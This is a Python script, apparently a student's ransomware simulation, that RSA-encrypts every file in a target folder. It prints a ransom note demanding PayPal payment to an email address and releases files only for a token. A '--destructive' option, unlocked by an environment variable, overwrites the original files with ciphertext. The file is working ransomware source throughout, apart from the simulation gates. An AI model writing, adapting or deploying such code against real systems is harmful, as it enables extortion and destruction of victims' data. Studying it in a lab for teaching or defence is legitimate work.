#!/usr/bin/env python3
# EUID: ss4334
import os
import sys
import json
import argparse
import getpass
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Hash import SHA1
import secrets
import string

# Configuration
EUID = "ss4334"
_local_target = Path.cwd() / f"personal_{EUID}"
TARGET = _local_target if _local_target.exists() else (Path.home() / f"personal_{EUID}")

KEYS_DIR = Path.cwd() / "keys"
ENC_DIR = Path.cwd() / "encrypted_sim"
DEC_DIR = Path.cwd() / "decrypted_sim"
PRIV = KEYS_DIR / "rsa_priv.pem"
PUB = KEYS_DIR / "rsa_pub.pem"
TOKEN_FILE = KEYS_DIR / "token.txt"

# ransom note display
def display_ransom_note():
    note = (
        "\n================= RANSOM ATTACK =================\n"
        "Your files have been encrypted in a major ransomware attack!\n"
        f"To retrieve your files, you must pay $3000 and a token  will provided to decrypt.\n"
        "Sent $30000 to Email ss4334@myunt.edu paypal and also email a screenshot of payment succesful\n\n"
        "To decrypt your files, run:\n"
        "    python3 ransomware_sim.py decrypt\n\n"
        "enter the token when prompted to recover your files.\n"
        "Good luck!\n"
        "===========================================================\n"
    )
    print(note)

# Utilities
def ensure_dirs():
    for d in (KEYS_DIR, ENC_DIR, DEC_DIR):
        d.mkdir(parents=True, exist_ok=True)

def confirm_destructive():
    return os.environ.get("CONFIRM_DESTRUCTIVE", "") == "I_AM_IN_VM_AND_AUTHORIZE"
# warning and exit
def warn_and_exit(msg):
    print("ERROR:", msg)
    sys.exit(1)

# Key management
def gen_keys(bits=2048):
    if PRIV.exists() and PUB.exists():
        return
    pw = getpass.getpass("New RSA passphrase (for private key file): ")
    if not pw:
        warn_and_exit("Passphrase required.")
    key = RSA.generate(bits)
    PRIV.write_bytes(key.export_key(format='PEM', passphrase=pw, pkcs=8, protection="scryptAndAES128-CBC"))
    PUB.write_bytes(key.publickey().export_key())
    print("Keys generated in ./keys/")
# load public key
def load_pub():
    if not PUB.exists():
        warn_and_exit("Public key missing. Run encrypt to generate keys.")
    return RSA.import_key(PUB.read_bytes())
# load private key
def load_priv():
    if not PRIV.exists():
        warn_and_exit("Private key missing.")
    pw = getpass.getpass("RSA private key passphrase: ")
    try:
        return RSA.import_key(PRIV.read_bytes(), passphrase=pw)
    except ValueError:
        warn_and_exit("Bad private key passphrase.")

# Token management
def generate_token(length=16):
    alphabet = string.ascii_letters + string.digits
    return ''.join(secrets.choice(alphabet) for _ in range(length))
# save token to file for later verification
def save_token(token: str):
    TOKEN_FILE.write_text(token)
    try:
        TOKEN_FILE.chmod(0o600)
    except Exception:
        pass
# get saved token
def read_token():
    if not TOKEN_FILE.exists():
        return None
    return TOKEN_FILE.read_text().strip()

# RSA chunk helpers for OAEP
def rsa_max_plaintext_bytes(rsa_key):
    key_bytes = rsa_key.size_in_bytes()
    hash_len = SHA1.digest_size
    return key_bytes - 2 * hash_len - 2

def chunk_bytes(data: bytes, size: int):
    for i in range(0, len(data), size):
        yield data[i:i+size]

# File encrypt/decrypt using RSA-only 
def encrypt_file_rsa(pub_key, src_path: Path, outroot: Path, destructive=False):
    data = src_path.read_bytes()
    rsa_cipher = PKCS1_OAEP.new(pub_key)  # OAEP with SHA-1 by default
    max_plain = rsa_max_plaintext_bytes(pub_key)
    if max_plain <= 0:
        warn_and_exit("RSA key too small for OAEP chunking.")
    chunks = list(chunk_bytes(data, max_plain))
    ciphertext_blocks = [rsa_cipher.encrypt(ch) for ch in chunks]
    rel = src_path.relative_to(TARGET)
    out_file = outroot / rel.with_suffix(rel.suffix + ".enc")
    out_file.parent.mkdir(parents=True, exist_ok=True)
    with out_file.open("wb") as f:
        for b in ciphertext_blocks:
            f.write(b)
    meta = {
        "rel": str(rel),
        "rsa_block_size": pub_key.size_in_bytes(),
        "plain_chunk_size": max_plain,
        "original_size": len(data),
        "num_blocks": len(ciphertext_blocks)
    }
    meta_path = out_file.with_suffix(out_file.suffix + ".meta.json")
    meta_path.write_text(json.dumps(meta))
    if destructive:
        # Overwrite original with ciphertext 
        src_path.write_bytes(b"".join(ciphertext_blocks))
    return out_file, meta_path

# File decrypt using RSA-
def decrypt_file_rsa(priv_key, enc_path: Path, meta_path: Path, outroot: Path):
    m = json.loads(meta_path.read_text())
    block_size = int(m["rsa_block_size"])
    # Read ciphertext
    data = enc_path.read_bytes()
    blocks = [data[i:i+block_size] for i in range(0, len(data), block_size)]
    rsa_cipher = PKCS1_OAEP.new(priv_key)
    plaintext_parts = []
    for b in blocks:
        plaintext_parts.append(rsa_cipher.decrypt(b))
    plaintext = b"".join(plaintext_parts)
    # Truncate to original size if present
    original_size = int(m.get("original_size", 0))
    if original_size:
        plaintext = plaintext[:original_size]
    rel = Path(m["rel"])
    out_file = outroot / rel
    out_file.parent.mkdir(parents=True, exist_ok=True)
    out_file.write_bytes(plaintext)
    return out_file

# High level flows
def encrypt_all(sim=True, destructive=False):
    ensure_dirs()
    if not TARGET.exists():
        warn_and_exit(f"Target folder not found: {TARGET}")

    # generate and save token
    token = generate_token()
    save_token(token)

    gen_keys()
    pub = load_pub()

    files = [p for p in TARGET.rglob("*") if p.is_file()]
    if not files:
        print("No files to encrypt.")
        return

    for f in files:
        # skip working dirs inside target
        if KEYS_DIR in f.parents or ENC_DIR in f.parents or DEC_DIR in f.parents:
            continue
        outroot = ENC_DIR if sim else TARGET.parent
        enc_path, meta_path = encrypt_file_rsa(pub, f, outroot, destructive=(destructive and not sim))
        print(f"enc: {f} -> {enc_path} (meta: {meta_path})")
    print("Done.")
    display_ransom_note()

# decrypt all files in ENC_DIR
def decrypt_all():
    ensure_dirs()
    token = read_token()
    if token is None:
        print("No token found. Run encrypt first to generate token.")
        return
    provided = getpass.getpass("Enter decryption token: ")
    if provided != token:
        print("Invalid token. Aborting.")
        return
    priv = load_priv()
    metas = list(ENC_DIR.rglob("*.meta.json"))
    if not metas:
        print("No metadata found in encrypted_sim/")
        return
    for meta in metas:
        enc = Path(str(meta)[:-len(".meta.json")])
        if not enc.exists():
            print("Missing encrypted file for meta:", meta)
            continue
        out = decrypt_file_rsa(priv, enc, meta, DEC_DIR)
        print("dec:", enc, "->", out)
    print("Decryption complete. Decrypted files written to ./decrypted_sim/")

# create main entry point 
def main():
    p = argparse.ArgumentParser(description="RSA-only chunked encryption.")
    sub = p.add_subparsers(dest="cmd")
    e = sub.add_parser("encrypt", help="Run encryption; (writes copies to ./encrypted_sim/)")
    e.add_argument("--destructive", action="store_true", help="(DANGEROUS) overwrite originals (requires env confirm)")
    sub.add_parser("decrypt", help="Run decryption (requires token + RSA private key passphrase)")
    args = p.parse_args()

    if not args.cmd:
        # default: encrypt 
        encrypt_all(sim=True)
        return

    if args.cmd == "encrypt":
        if args.destructive:
            if not confirm_destructive():
                warn_and_exit('To enable destructive mode set CONFIRM_DESTRUCTIVE="I_AM_IN_VM_AND_AUTHORIZE"')
            print("Destructive mode enabled (only run in VM)")
            encrypt_all(sim=False, destructive=True)
        else:
            encrypt_all(sim=True)
    elif args.cmd == "decrypt":
        decrypt_all()
    else:
        p.print_help()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nInterrupted by user.")
    except Exception as e:
        print("Unexpected error:", e)
        import traceback
        traceback.print_exc()
    finally:
        try:
            input("\nPress Enter to exit...")
        except Exception:
            pass
